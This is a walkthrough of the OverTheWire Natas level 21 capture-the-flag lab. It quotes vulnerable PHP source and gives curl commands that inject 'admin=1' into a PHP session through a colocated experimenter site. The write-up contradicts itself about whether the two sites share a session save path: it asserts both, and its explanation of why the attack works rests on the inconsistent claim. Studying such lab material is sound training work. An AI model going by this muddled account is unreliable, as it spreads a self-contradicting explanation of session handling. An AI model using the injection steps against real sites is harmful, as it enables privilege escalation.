> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas21.natas.labs.overthewire.org`                  |
| Username | `natas21`                                                    |
| Password | *found in [Natas Level 19 → 20](natas-level-19-level-20.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — both sites link to their own PHP source
- **`curl`** — to copy a session ID from the experimenter site to the main site

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas21.natas.labs.overthewire.org` and log in with the password from Level 20.

The page says: **"Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org"**. The main site itself only displays "You are logged in as a regular user" or the password if the session has `admin == 1`. There is no form, no input, nothing to interact with here. Click **View sourcecode**.

---

### Step 2 — Read Both Source Files

#### Main site — `natas21`

```php
<?php
session_start();

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas22\nPassword: <censored></pre>";
    } else {
        print "You are logged in as a regular user.";
    }
}

session_start();
print_credentials();
?>
```

The main site does nothing except start a session and call `print_credentials()`. It reads `$_SESSION["admin"]` and checks whether it equals `1`. No form, no user input — the only path to the password is arriving with a session that already has `admin == 1`.

#### Experimenter site — `natas21-experimenter`

```php
<?php
session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;   // every POST parameter is stored directly into the session — no filtering
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");

$form = "";
$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
        $val = $_SESSION[$key];   // display the stored session value in the form field
    } else {
        $_SESSION[$key] = $val;   // initialise missing keys to defaults
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style  = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";
?>
```

The `$validkeys` array looks like a whitelist but it controls only what the form _displays_ — the three CSS keys shown to the user. It has no effect on what gets written to the session. The `foreach($_REQUEST as $key => $val)` loop runs unconditionally before `$validkeys` is ever consulted, storing every POST parameter into `$_SESSION`. `$validkeys` is then used only to build the HTML form fields. Submitting `admin=1` is never checked against it and goes straight into `$_SESSION["admin"] = 1`.

Both sites are **colocated**, they share the same PHP session storage directory on the server. A session file written by the experimenter site can be read by the main site, provided the same `PHPSESSID` cookie is sent to both.

---

### Understand the Cross-Site Session Injection

The two sites are separate virtual hosts that share the same server filesystem but use **separate session save paths**. A session file written by the experimenter is not visible to the main site's save directory and vice versa — so injecting `admin=1` from the experimenter side and then presenting that session ID to the main site fails: the main site looks in its own directory and finds nothing.

The correct direction is the reverse:

1. Send a **GET** request to the **main site** to obtain a `PHPSESSID`. This creates a session file in the main site's save directory.
2. Send a **POST** request to the **experimenter** with that same `PHPSESSID` and `admin=1&submit=1`. The experimenter's `foreach` loop writes into whatever session file corresponds to the ID you present — which is now the main site's file, since both share the same filesystem.
3. Send a **GET** request back to the **main site** with the same `PHPSESSID`. The main site loads its own session file, which now contains `admin=1`, and prints the password.

The key insight: `PHPSESSID` is just a string key into a file on disk. Nothing ties a session ID to the host that created it. You can present any session ID to either host, and that host will read or write the corresponding file — provided the file exists in that host's save path. By seeding the session from the main site first, you ensure the file is in the right directory before the experimenter writes into it.

---

### Step 3 — Get a Session ID from the Main Site

The two virtual hosts share the same server but use **separate session save paths**. A session file written by the experimenter is not visible to the main site and vice versa. The correct direction is: obtain a session ID from the main site first, then use the experimenter to write `admin=1` into that file, then read it back from the main site.

```bash
curl -u natas21:<password> \
     -c cookies_main.txt \
     "http://natas21.natas.labs.overthewire.org/index.php"
```

|Flag / argument|Meaning|
|---|---|
|`-u natas21:<password>`|HTTP Basic Auth — both sites share the same credentials|
|`-c cookies_main.txt`|Save the `PHPSESSID` cookie assigned by the main site|

```bash
cat cookies_main.txt
```

The last field on the `PHPSESSID` line is the session ID, e.g. `v1th0mjnd6avrfel0fm0jq37v6`. The main site's session file now exists in its save path on disk.

---

### Step 4 — Inject `admin=1` via the Experimenter

Send that session ID to the experimenter with `admin=1&submit=1`. The experimenter's `foreach` loop will write `admin=1` into whatever session file corresponds to the ID you present — including the main site's file, since they share the same filesystem.

```bash
curl -u natas21:<password> \
     -H "Cookie: PHPSESSID=<session ID from step 3>" \
     "http://natas21-experimenter.natas.labs.overthewire.org/index.php" \
     --data "admin=1&submit=1"
```

|Flag / argument|Meaning|
|---|---|
|`-H "Cookie: PHPSESSID=..."`|Manually set the cookie header — bypasses curl's domain-scoping rules, which would otherwise refuse to send a cookie from one host to a different host|
|`--data "admin=1&submit=1"`|POST body: `submit` triggers the `foreach` loop; `admin=1` is stored into `$_SESSION["admin"]`|

The session file on disk now contains `admin = 1` alongside the default CSS keys.

---

### Step 5 — Read the Session Back from the Main Site

```bash
curl -u natas21:<password> \
     -H "Cookie: PHPSESSID=<session ID from step 3>" \
     "http://natas21.natas.labs.overthewire.org/index.php"
```

The main site calls `session_start()`, loads its own session file (now containing `admin=1`), and `print_credentials()` outputs the password.

Output:

```
You are an admin. The credentials for the next level are:
Username: natas22
Password: <password>
```

That is the password for [Natas Level 21 → 22](natas-level-21-level-22.md).

---

## Key Takeaways

- **Colocated sites that share a session store must treat each other as mutually trusted.** If one site writes unsanitised user input into the shared session storage, every other colocated site inherits whatever was written there. The trust boundary is the session store, not the individual application.
- **`PHPSESSID` is just a string key into a file on disk — it is not tied to a hostname, but it is tied to a save path.** Both sites share the same filesystem, but each virtual host has its own `session.save_path`. A session file created by the experimenter is invisible to the main site's directory. The attack only works in the direction where the main site creates the session first, establishing the file in its own save path, and the experimenter then writes into that file by being handed the same ID. Assuming "colocated" means "fully shared session store" is wrong; the save paths are separate.
- **A `foreach` loop over `$_REQUEST` into `$_SESSION` is equivalent to no access control at all.** Every form field becomes a session variable. Any parameter the attacker can name — including `admin`, `role`, `is_superuser` — can be set to any value. The `$validkeys` array present in the source looks like a whitelist but only governs which keys are _rendered_ in the HTML form — it has no effect on what gets written to the session. This is a common structural mistake: defensive-looking code that runs after the vulnerable operation, providing the appearance of a guard without the function of one. A whitelist of accepted keys checked _before_ the write, or explicit per-field assignments, is the only correct approach.
- **The main site has no vulnerability of its own.** Reading `$_SESSION["admin"]` is correct behaviour. The flaw is entirely in the experimenter site's unrestricted write path. This illustrates that a vulnerability in one application can directly compromise a separate application that shares infrastructure.

---